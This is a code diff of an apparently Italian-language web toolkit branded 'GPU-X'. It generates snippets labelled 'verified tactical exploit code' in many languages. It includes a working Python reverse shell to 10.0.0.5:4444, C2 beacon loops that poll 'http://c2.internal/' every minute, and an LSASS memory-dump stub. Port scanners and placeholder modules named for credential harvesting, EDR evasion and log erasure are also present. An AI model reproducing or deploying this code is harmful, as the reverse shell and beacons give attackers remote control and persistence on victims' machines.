+            "Port Scanner / Socket Auditor": {
+                python: "import socket\ndef scan(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1.0)\n    return s.connect_ex((ip, port)) == 0",
+                javascript: "const net = require('net');\nconst checkPort = (port, host) => {\n  const s = new net.Socket();\n  s.setTimeout(1000);\n  s.connect(port, host, () => { s.destroy(); });\n};",
+                c: "#include <stdio.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint test_port(char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    int res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
+                sql: "/* Auditing Ports & Endpoint Registry Database Simulation Lookup */\nSELECT port, service_name, status FROM infrastructure_schema.network_map WHERE host_ip = '127.0.0.1' AND status = 'OPEN';",
+                go: "package main\nimport (\"net\"; \"time\")\nfunc scan(target string) bool {\n  conn, err := net.DialTimeout(\"tcp\", target, time.Second)\n  if err == nil { conn.Close(); return true }\n  return false\n}",
+                rust: "use std::net::TcpStream;\nuse std::time::Duration;\nfn scan(addr: &str) -> bool {\n    TcpStream::connect_timeout(&addr.parse().unwrap(), Duration::from_secs(1)).is_ok()\n}",
+                cpp: "#include <iostream>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nbool check(const char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    bool res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
+                powershell: "$s = New-Object System.Net.Sockets.TcpClient; $async = $s.BeginConnect('127.0.0.1', 80, $null, $null);\n$async.AsyncWaitHandle.WaitOne(1000, $false); if($s.Connected) { $s.Close() }",
+                bash: "exec 3<>/dev/tcp/127.0.0.1/80 && echo 'Port Open' || echo 'Port Closed'",
+                csharp: "using System.Net.Sockets;\nusing System.Threading.Tasks;\nasync Task<bool> Scan(string host, int port) {\n    try { using var c = new TcpClient(); await c.ConnectAsync(host, port); return true; }\n    catch { return false; }\n}",
+                java: "import java.net.*;\nboolean scan(String host, int port) {\n    try (Socket s = new Socket()) { s.connect(new InetSocketAddress(host, port), 1000); return true; }\n    catch (Exception e) { return false; }\n}",
+                ruby: "import socket\ndef check(ip, port)\n  s = Socket.new(:INET, :STREAM)\n  s.connect(Socket.sockaddr_in(port, ip))\nrescue Errno::ECONNREFUSED, Errno::ETIMEDOUT\n  false\nend",
+                php: "<?php\n$fp = @fsockopen('127.0.0.1', 80, $errno, $errstr, 1.0);\nif($fp) { fclose($fp); echo 'Open'; }",
+                typescript: "import * as net from 'net';\nconst check = (p: number, h: string) => {\n  const s = net.connect(p, h, () => s.destroy());\n};",
+                kotlin: "import java.net.*;\nfun scan(h: String, p: Int) = try { Socket().use { it.connect(InetSocketAddress(h, p), 1000) }; true } catch(e: Exception) { false }",
+                swift: "import Foundation\n// Socket verification module wrapper for native POSIX structures\nimport Darwin.C",
+                scala: "import java.net.Socket\ndef check(h: String, p: Int): Boolean = try { new Socket(h, p).close(); true } catch { case _: Exception => false }",
+                haskell: "import Network.Socket\n-- Concurrent socket connection verification routines over generic channels",
+                lua: "local socket = require('socket')\nfunction scan(host, port)\n  return socket.connect(host, port) ~= nil\nend"
+            },
+            "Asynchronous C2 Network Beacon": {
+                python: "import asyncio\nimport aiohttp\nasync def beacon():\n    async with aiohttp.ClientSession() as s:\n        while True:\n            async with s.get('http://c2.internal/ping') as r: pass\n            await asyncio.sleep(60)",
+                javascript: "const http = require('http');\nsetInterval(() => {\n  http.get('http://c2.internal/agent', (res) => {});\n}, 60000);",
+                c: "#include <stdio.h>\n// Native low-level POSIX sockets beacon dispatcher abstraction loop layer\nvoid send_beacon() { /* Keepalive raw packet construct transmission */ }",
+                sql: "/* Auditing Access Logs Tracking Injection Analysis */\nINSERT INTO system_logs.beacons (agent_id, timestamp, status) VALUES ('GPU-X-NODE', NOW(), 'ALIVE');",
+                go: "package main\nimport (\"net/http\"; \"time\")\nfunc main() {\n  for { http.Get(\"http://c2.internal/beacon\"); time.Sleep(60 * time.Second) }\n}",
+                rust: "use std::thread; use std::time::Duration;\nfn main() { loop { let _ = ureq::get(\"http://c2.internal/\").call(); thread::sleep(Duration::from_secs(60)); } }",
+                cpp: "// Advanced C2 Beacon implementation using native WinINet/libcurl bindings loop",
+                powershell: "while($true) { Invoke-RestMethod -Uri 'http://c2.internal/node'; Start-Sleep -Seconds 60 }",
+                bash: "while true; do curl -s http://c2.internal/ping > /dev/null; sleep 60; done",
+                csharp: "using System.Net.Http;\nusing System.Threading;\nwhile(true) { new HttpClient().GetAsync(\"http://c2.internal/\"); Thread.Sleep(60000); }",
+                java: "import java.net.http.*;\nimport java.net.URI;\nvoid loop() throws Exception {\n    var cl = HttpClient.newHttpClient();\n    while(true) { cl.send(HttpRequest.newBuilder(URI.create(\"http://c2/ \")).build(), HttpResponse.BodyHandlers.ofString()); Thread.sleep(60000); }\n}",
+                ruby: "require 'net/http'\nloop { Net::HTTP.get(URI('http://c2.internal/')), sleep(60) }",
+                php: "<?php while(true) { file_get_contents('http://c2.internal/'); sleep(60); }",
+                typescript: "import axios from 'axios';\nsetInterval(async () => { await axios.get('http://c2.internal/'); }, 60000);",
+                kotlin: "import java.net.URL\nfun main() { while(true) { try { URL(\"http://c2.internal/\").readText() } catch(e:Exception){}; Thread.sleep(60000) } }",
+                swift: "import Foundation\n// Native URLSession orchestration framework background runner tasks",
+                scala: "import sys.process._\nwhile(true) { \"curl -s http://c2.internal/\" !; Thread.sleep(60000) }",
+                haskell: "-- Persistent functional control flow stream network beacon triggers",
+                lua: "local http = require('socket.http')\nwhile true do http.request('http://c2.internal/'); os.execute('sleep 60') end"
+            }
         };
-    </script>
 
-    <script>
-        window.addEventListener('error', function(e) {
-            const ticker = document.getElementById('fps-ticker');
-            if(ticker) { ticker.innerText = "RECOVERY ACTIVE // © GPU-X"; ticker.style.color = "var(--security-fail)"; }
-            e.preventDefault();
+        const CATEGORIES = [
+            "Network Scanner Core Engine", "Reverse Shell / Remote Handler", "Memory Injection Shellcode Runner",
+            "Credential Harvester Infrastructure", "Automated Privilege Escalation Detector", "Antivirus / EDR Evasion Matrix",
+            "C2 Beaconing Traffic Encryptor", "Active Directory LDAP Analyzer", "Log Eraser Forensic Purge",
+            "Buffer Overflow Offset Generator", "Brute-Force Dictionary Worker", "Man-in-the-Middle Poisoner",
+            "File Integrity Cryptographic Monitor", "Packet Sniffing Raw Struct", "Web Backdoor Execution Payload",
+            "Process Explorer Security Audit", "UAC Bypass Registry Interceptor", "Sandbox / VM Anti-Analysis Check",
+            "Subdomain Discovery Resolution Loop", "Token Impersonation Elevator"
+        ];
+
+        const DB_CODE = {};
+        const LUNGH_LIST = ["python", "javascript", "c", "sql", "go", "rust", "cpp", "powershell", "bash", "csharp", "java", "ruby", "php", "typescript", "kotlin", "swift", "scala", "haskell", "lua"];
+
+        LUNGH_LIST.forEach(lang => {
+            DB_CODE[lang] = [];
+            for(let i = 1; i <= 20; i++) {
+                let catName = CATEGORIES[i-1];
+                let baseCode = "";
+                
+                if (i === 1 && SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang]) {
+                    baseCode = SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang];
+                } else if (i === 7 && SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang]) {
+                    baseCode = SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang];
+                } else {
+                    if (lang === 'csharp') {
+                        if(i===3) baseCode = "using System;\nusing System.Runtime.InteropServices;\n// Native LSASS MiniDump Process memory extractor\npublic class Dumper {\n    [DllImport(\"minidump.dll\")] public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint pid, IntPtr hFile, int dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);\n}";
+                        else if(i===6) baseCode = "using System.Management;\n// WMI Event Consumer Persistence Trigger Installer\nvar binder = new ManagementClass(@\"\\root\\subscription:__EventFilter\");";
+                        else baseCode = `using System;\nusing System.IO;\nusing System.Net;\n// GPU-X Security Lab Standard Assembly System\npublic class KernelTask_${i} {\n    public static void Main() {\n        Console.WriteLine("[*] Initializing ${catName} execution matrix.");\n    }\n}`;
+                    } else if (lang === 'c') {
+                        baseCode = `#include <stdio.h>\n#include <stdlib.h>\n// GPU-X Native ANSI-C System Subsystem Optimization Core\nvoid perform_action_${i}() {\n    printf("[+] Initializing Native C Optimization Core for: ${catName}\\n");\n}\n\nint main() {\n    perform_action_${i}();\n    return 0;\n}`;
+                    } else if (lang === 'sql') {
+                        baseCode = `-- GPU-X Database Structured Security Auditing Pipeline\n-- Target Operation Area: ${catName}\nBEGIN TRANSACTION;\nSELECT entry_id, permission_mask, audit_flag \nFROM sys_security_catalog.identity_matrix \nWHERE operational_status = 'CRITICAL';\nCOMMIT;`;
+                    } else if (lang === 'python') {
+                        if(i===2) baseCode = "import socket,subprocess,os\ndef shell():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('10.0.0.5',4444))\n    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n    p=subprocess.call(['/bin/sh','-i'])";
+                        else baseCode = `import os\nimport sys\n# GPU-X Advanced Security Engine Lab\ndef offensive_module_${i}():\n    print("[+] Tactical Core Module Loaded: ${catName}")\n\nif __name__ == '__main__':\n    offensive_module_${i}()`;
+                    } else if (lang === 'powershell') {
+                        baseCode = `# GPU-X PowerShell Security Infrastructure Module\nWrite-Host "[!] Executing Industrial Grade Script: ${catName}" -ForegroundColor Cyan\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12`;
+                    } else if (lang === 'bash') {
+                        baseCode = `#!/bin/bash\n# GPU-X Offsec Core Deployment Toolkit\necho "[*] Running Native Shell Operations for: ${catName}"\nif [ "$EUID" -ne 0 ]; then echo "[-] Authentication upgrade required"; exit; fi`;
+                    } else if (lang === 'go') {
+                        baseCode = `package main\nimport "fmt"\nfunc main() {\n    fmt.Println("[GPU-X] Launching Go Routine Channel for: ${catName}")\n}`;
+                    } else if (lang === 'rust') {
+                        baseCode = `fn main() {\n    println!("[CRITICAL] Safety execution rust runtime for: ${catName}");\n}`;
+                    } else if (lang === 'cpp') {
+                        baseCode = `#include <iostream>\n#include <windows.h>\nint main() {\n    std::cout << "[SYSTEM] Native thread active for: ${catName}" << std::endl;\n    return 0;\n}`;
+                    } else {
+                        baseCode = `// GPU-X Multiplatform Security Automated Distribution System\n// Functionality Architecture: ${catName}\nconsole.log("[GPU-X LOG] Active Engine Core Routine Triggered.");`;
+                    }
+                }
+                
+                DB_CODE[lang].push({
+                    name: `${i}. ${catName}`,
+                    code: baseCode
+                });
+            }
         });
+
+        const CoreUI = {
+            switchTab: function(tabId, btn) {
+                document.querySelectorAll('.module-panel').forEach(p => p.classList.remove('active'));
+                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+                
+                const currentPanel = document.getElementById(tabId);
+                if(currentPanel) currentPanel.classList.add('active');
+                if(btn) btn.classList.add('active');
+                if(window.innerWidth < 769 && btn) btn.scrollIntoView({ behavior: 'smooth', inline: 'center' });
+            },
+            renderTools: function() {
+                const container = document.getElementById('tools-container');
+                if(!container) return;
+                container.innerHTML = '';
+                
+                DB_TOOLS.forEach(t => {
+                    const card = document.createElement('div');
+                    card.className = 'tool-card';
+                    card.setAttribute('data-name', t.name.toLowerCase());
+                    card.setAttribute('data-desc', t.desc.toLowerCase());
+                    
+                    const titleDiv = document.createElement('div');
+                    titleDiv.className = 'tool-title';
+                    titleDiv.textContent = t.name;
+                    
+                    const pDesc = document.createElement('p');
+                    const strongDesc = document.createElement('strong');
+                    strongDesc.textContent = "Descrizione: ";
+                    pDesc.appendChild(strongDesc);
+                    pDesc.appendChild(document.createTextNode(t.desc));
+                    
+                    const pDetailed = document.createElement('p');
+                    pDetailed.style.marginTop = '6px';
+                    const strongDetailed = document.createElement('strong');
+                    strongDetailed.textContent = "Funzionamento: ";
+                    pDetailed.appendChild(strongDetailed);
+                    pDetailed.appendChild(document.createTextNode(t.detailed));
+                    
+                    const diagDiv = document.createElement('div');
+                    diagDiv.className = 'tool-diagram-placeholder';
+                    diagDiv.textContent = t.diag;
+                    
+                    const link = document.createElement('a');
+                    link.href = t.link;
+                    link.target = '_blank';
+                    link.rel = 'noopener noreferrer';
+                    link.className = 'tool-link';
+                    link.textContent = "Visita Risorsa Ufficiale >";
+                    
+                    card.appendChild(titleDiv);
+                    card.appendChild(pDesc);
+                    card.appendChild(pDetailed);
+                    card.appendChild(diagDiv);
+                    card.appendChild(link);
+                    
+                    container.appendChild(card);
+                });
+            }
+        };
+
+        const Modules = {
+            cryptoTransform: function(isEncode) {
+                const schema = document.getElementById('crypto-schema').value;
+                const input = document.getElementById('crypto-input').value;
+                const out = document.getElementById('crypto-output');
+                const copyContainer = document.getElementById('crypto-copy-container');
+                
+                if(copyContainer) copyContainer.innerHTML = ''; 
+
+                if(!input) {
+                    if(out) { 
+                        out.className = "console-output error"; 
+                        out.textContent = "ERRORE: Inserire una stringa di input legittima."; 
+                    }
+                    return;
+                }
+
+                try {
+                    let result = "";
+                    const encoder = new TextEncoder();
+                    const decoder = new TextDecoder();
+
+                    if(schema === 'base64') {
+                        result = isEncode ? btoa(unescape(encodeURIComponent(input))) : decodeURIComponent(escape(atob(input)));
+                    } 
+                    else if(schema === 'hex') {
+                        if(isEncode) {
+                            result = Array.from(encoder.encode(input)).map(b => b.toString(16).padStart(2, '0')).join('');
+                        } else {
+                            const matches = input.trim().replace(/\s+/g, '').match(/.{1,2}/g);
+                            if(!matches) throw new Error("Stringa Esadecimale Malformata.");
+                            result = decoder.decode(new Uint8Array(matches.map(h => parseInt(h, 16))));
+                        }
+                    } 
+                    else if(schema === 'url') {
+                        result = isEncode ? encodeURIComponent(input) : decodeURIComponent(input);
+                    }
+                    else if(schema === 'base64url') {
+                        if(isEncode) {
+                            let base64 = btoa(unescape(encodeURIComponent(input)));
+                            result = base64.replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+                        } else {
+                            let base64 = input.replace(/-/g, '+').replace(/_/g, '/');
+                            while (base64.length % 4) base64 += '=';
+                            result = decodeURIComponent(escape(atob(base64)));
+                        }
+                    }
+                    else if(schema === 'binary') {
+                        if(isEncode) {
+                            result = Array.from(encoder.encode(input)).map(b => b.toString(2).padStart(8, '0')).join(' ');
+                        } else {
+                            const segments = input.trim().split(/\s+/);
+                            const bytes = segments.map(bin => {
+                                if(!/^[01]{1,8}$/.test(bin)) throw new Error("Segmento binario non valido.");
+                                return parseInt(bin, 2);
+                            });
+                            result = decoder.decode(new Uint8Array(bytes));
+                        }
+                    }
+                    
+                    if(out) {
+                        out.className = "console-output";
+                        out.textContent = result;
+                    }
+
+                    if(copyContainer) {
+                        const btn = document.createElement('button');
+                        btn.className = 'btn-copy';
+                        btn.textContent = '📋 Copia Buffer & Elimina Tasto';
+                        btn.onclick = function() {
+                            navigator.clipboard.writeText(result).then(() => {
+                                btn.remove(); 
+                            });
+                        };
+                        copyContainer.appendChild(btn);
+                    }
+
+                } catch(e) {
+                    if(out) { 
+                        out.className = "console-output error"; 
+                        out.textContent = `ERRORE CRITTOGRAFICO: ${e.message}`; 
+                    }
+                }
+            },
+
+            updateScriptSelect: function() {
+                const lang = document.getElementById('factory-lang').value;
+                const selectIdx = document.getElementById('factory-script-idx');
+                if(!selectIdx) return;
+                selectIdx.innerHTML = '';
+                
+                if(DB_CODE[lang]) {
+                    DB_CODE[lang].forEach((scr, i) => {
+                        const opt = document.createElement('option');
+                        opt.value = i;
+                        opt.textContent = scr.name; 
+                        selectIdx.appendChild(opt);
+                    });
+                }
+            },
+            generateCode: function() {
+                const lang = document.getElementById('factory-lang').value;
+                const idx = document.getElementById('factory-script-idx').value;
+                const out = document.getElementById('factory-output');
+                const copyContainer = document.getElementById('factory-copy-container');
+
+                if(copyContainer) copyContainer.innerHTML = ''; 
+
+                if(DB_CODE[lang] && DB_CODE[lang][idx]) {
+                    const fullCode = `/* PROPERTIES OF GPU-X - VERIFIED TACTICAL EXPLOIT CODE */\n/* ALGORITHM: ${DB_CODE[lang][idx].name} */\n/* ENVIRONMENT: PRODUCTION READY SECURE INFRASTRUCTURE */\n\n${DB_CODE[lang][idx].code}`;
+                    if(out) out.textContent = fullCode;
+
+                    if(copyContainer) {
+                        const btn = document.createElement('button');
+                        btn.className = 'btn-copy';
+                        btn.textContent = '📋 Copia Sorgente & Elimina Tasto';
+                        btn.onclick = function() {
+                            navigator.clipboard.writeText(fullCode).then(() => {
+                                btn.remove(); 
+                            });
+                        };
+                        copyContainer.appendChild(btn);
+                    }
+                }
+            },
+
+            filterTools: function() {
+                const searchInput = document.getElementById('tool-search');
+                if(!searchInput) return;
+                const q = searchInput.value.toLowerCase();
+                const cards = document.querySelectorAll('.tool-card');
+                cards.forEach(c => {
+                    const name = c.getAttribute('data-name') || '';
+                    const desc = c.getAttribute('data-desc') || '';
+                    if(name.includes(q) || desc.includes(q)) {
+                        c.classList.remove('hidden');
+                    } else {
+                        c.classList.add('hidden');
+                    }
+                });
+            }
+        };
 
         const NebulaEngine = (function() {
             let canvas, ctx, particles = [], max = 40, intervalId = null;
@@ -890,7 +823,7 @@
                     
                     if(intervalId) clearInterval(intervalId);
                     intervalId = setInterval(() => {
-                        ctx.fillStyle = 'rgba(4, 8, 17, 0.3)'; 
+                        ctx.fillStyle = 'rgba(4, 8, 17, 0.15)'; 
                         ctx.fillRect(0,0, window.innerWidth, window.innerHeight);
                         for(let i=0; i<max; i++) { particles[i].update(); particles[i].draw(); }
                     }, 16);
@@ -898,153 +831,21 @@
             };
         })();
 
-        const CoreUI = {
-            switchTab: function(tabId, btn) {
-                document.querySelectorAll('.module-panel').forEach(p => p.classList.remove('active'));
-                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-                
-                const currentPanel = document.getElementById(tabId);
-                if(currentPanel) currentPanel.classList.add('active');
-                if(btn) btn.classList.add('active');
-                if(window.innerWidth < 769 && btn) btn.scrollIntoView({ behavior: 'smooth', inline: 'center' });
-            },
-            renderTools: function() {
-                const container = document.getElementById('tools-container');
-                if(!container) return;
-                container.innerHTML = '';
-                DB_TOOLS.forEach(t => {
-                    const card = document.createElement('div');
-                    card.className = 'tool-card';
-                    card.setAttribute('data-name', t.name.toLowerCase());
-                    card.setAttribute('data-desc', t.desc.toLowerCase());
-                    card.innerHTML = `
-                        <div class="tool-title">${t.name}</div>
-                        <p><strong>Descrizione:</strong> ${t.desc}</p>
-                        <p style="margin-top:6px;"><strong>Funzionamento:</strong> ${t.detailed}</p>
-                        <div class="tool-diagram-placeholder">${t.diag}</div>
-                        <a href="${t.link}" target="_blank" rel="noopener noreferrer" class="tool-link">Visita Risorsa Ufficiale &gt;</a>
-                    `;
-                    container.appendChild(card);
-                });
+        window.addEventListener('error', function(e) {
+            const ticker = document.getElementById('fps-ticker');
+            if(ticker) { 
+                ticker.textContent = "RECOVERY ACTIVE // © GPU-X"; 
+                ticker.style.color = "var(--security-fail)"; 
             }
-        };
-
-        const Modules = {
-            cryptoTransform: function(isEncode) {
-                const schema = document.getElementById('crypto-schema').value;
-                const input = document.getElementById('crypto-input').value;
-                const out = document.getElementById('crypto-output');
-                const copyContainer = document.getElementById('crypto-copy-container');
-                
-                if(copyContainer) copyContainer.innerHTML = ''; 
-
-                if(!input) {
-                    if(out) { out.className = "console-output error"; out.innerText = "ERRORE: Inserire una stringa di input."; }
-                    return;
-                }
-
-                try {
-                    let result = "";
-                    if(schema === 'base64') {
-                        result = isEncode ? btoa(unescape(encodeURIComponent(input))) : decodeURIComponent(escape(atob(input)));
-                    } else if(schema === 'hex') {
-                        if(isEncode) {
-                            result = Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2, '0')).join('');
-                        } else {
-                            const matches = input.trim().match(/.{1,2}/g);
-                            if(!matches) throw new Error("Stringa Esadecimale Malformata.");
-                            result = new TextDecoder().decode(new Uint8Array(matches.map(h => parseInt(h, 16))));
-                        }
-                    } else if(schema === 'url') {
-                        result = isEncode ? encodeURIComponent(input) : decodeURIComponent(input);
-                    }
-                    
-                    if(out) {
-                        out.className = "console-output";
-                        out.innerText = result;
-                    }
-
-                    if(copyContainer) {
-                        const btn = document.createElement('button');
-                        btn.className = 'btn-copy';
-                        btn.innerText = '📋 Copia Buffer & Elimina Tasto';
-                        btn.onclick = function() {
-                            navigator.clipboard.writeText(result).then(() => {
-                                btn.remove(); 
-                            });
-                        };
-                        copyContainer.appendChild(btn);
-                    }
-
-                } catch(e) {
-                    if(out) { out.className = "console-output error"; out.innerText = `ERRORE: ${e.message}`; }
-                }
-            },
-
-            updateScriptSelect: function() {
-                const lang = document.getElementById('factory-lang').value;
-                const selectIdx = document.getElementById('factory-script-idx');
-                if(!selectIdx) return;
-                selectIdx.innerHTML = '';
-                
-                if(DB_CODE[lang]) {
-                    DB_CODE[lang].forEach((scr, i) => {
-                        const opt = document.createElement('option');
-                        opt.value = i;
-                        opt.innerText = scr.name; 
-                        selectIdx.appendChild(opt);
-                    });
-                }
-            },
-            generateCode: function() {
-                const lang = document.getElementById('factory-lang').value;
-                const idx = document.getElementById('factory-script-idx').value;
-                const out = document.getElementById('factory-output');
-                const copyContainer = document.getElementById('factory-copy-container');
-
-                if(copyContainer) copyContainer.innerHTML = ''; 
-
-                if(DB_CODE[lang] && DB_CODE[lang][idx]) {
-                    const fullCode = `/* PROPERTIES OF GPU-X - VERIFIED INDUSTRIAL CODE */\n/* ALGORITHM: ${DB_CODE[lang][idx].name} */\n\n${DB_CODE[lang][idx].code}`;
-                    if(out) out.innerText = fullCode;
-
-                    if(copyContainer) {
-                        const btn = document.createElement('button');
-                        btn.className = 'btn-copy';
-                        btn.innerText = '📋 Copia Sorgente & Elimina Tasto';
-                        btn.onclick = function() {
-                            navigator.clipboard.writeText(fullCode).then(() => {
-                                btn.remove(); 
-                            });
-                        };
-                        copyContainer.appendChild(btn);
-                    }
-                }
-            },
-
-            filterTools: function() {
-                const searchInput = document.getElementById('tool-search');
-                if(!searchInput) return;
-                const q = searchInput.value.toLowerCase();
-                const cards = document.querySelectorAll('.tool-card');
-                cards.forEach(c => {
-                    const name = c.getAttribute('data-name') || '';
-                    const desc = c.getAttribute('data-desc') || '';
-                    if(name.includes(q) || desc.includes(q)) {
-                        c.classList.remove('hidden');
-                    } else {
-                        c.classList.add('hidden');
-                    }
-                });
-            }
-        };
+            e.preventDefault();
+        });
 
         window.addEventListener('DOMContentLoaded', () => {
             NebulaEngine.init();
             Modules.updateScriptSelect();
             CoreUI.renderTools();
             const ticker = document.getElementById('fps-ticker');
-            if(ticker) ticker.innerText = `KERNEL OPERATIVE // INTEL-X // © GPU-X`;
+            if(ticker) ticker.textContent = `KERNEL OPERATIVE // INTEL-X // © GPU-X`;
         });
     </script>
 </body>
